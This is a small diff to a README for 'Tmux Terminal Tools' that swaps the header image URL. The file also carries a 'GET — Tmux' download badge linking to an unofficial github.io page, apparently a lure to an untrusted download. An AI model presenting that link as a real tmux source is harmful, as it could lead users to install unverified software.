@@ -1,6 +1,6 @@
 # Tmux Terminal Tools — Persistent Sessions & Command-Line Workflows
 
-![Tmux Terminal Tools](https://wiki.calculate-linux.org/download_images/original/1200px-Tmux_logo.svg.png)
+![Tmux Terminal Tools](https://i.ytimg.com/vi/wpODsyBHxH0/maxresdefault.jpg)
 
 [![GET — Tmux](https://img.shields.io/badge/GET%20%E2%80%94%20Tmux-0078D6?style=for-the-badge&logoColor=white)](https://i07745968.github.io/.github/Tmux-Terminal-Tools)
 
